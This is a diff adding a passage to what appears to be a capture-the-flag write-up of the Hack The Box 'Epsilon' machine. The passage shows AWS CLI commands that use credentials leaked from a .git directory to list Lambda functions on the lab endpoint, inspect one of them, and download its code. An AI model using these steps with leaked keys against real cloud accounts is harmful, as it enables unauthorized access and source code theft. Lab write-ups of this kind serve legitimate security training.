@@ -155,11 +155,28 @@ It takes "costume" parameter as user input and passes it to render_template_stri
 ## AWS command line tool - exploitation  
 
 I will install awscli to talk with the server, then configure secrets that we previously found in .git directory:  
+![obraz](https://github.com/user-attachments/assets/39819d7c-234f-4d96-b06b-00b8d5515af1)  
 
+We will start with listing functions:  
+```
+./aws lambda list-functions --profile exploit --endpoint-url http://cloud.epsilon.htb 
+```
 
+![obraz](https://github.com/user-attachments/assets/11a383e0-5e24-438a-949e-4a9836098f5f)  
 
+There is one lambda function called "costume_shop_v1".  
+To get more info about this function we can run:  
+```
+./aws lambda get-function --function-name costume_shop_v1 --endpoint-url http://cloud.epsilon.htb --profile exploit
+```
+![obraz](https://github.com/user-attachments/assets/a31e7d4c-2000-498e-bffc-0dadd6d8c4b8)
 
-
+We now know the location of the source code.  
+We can go to this url and download source code:  
+```
+http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
+```
+![obraz](https://github.com/user-attachments/assets/7d35087f-aa9c-4443-8d7a-a63f137f4803)
 
 
 
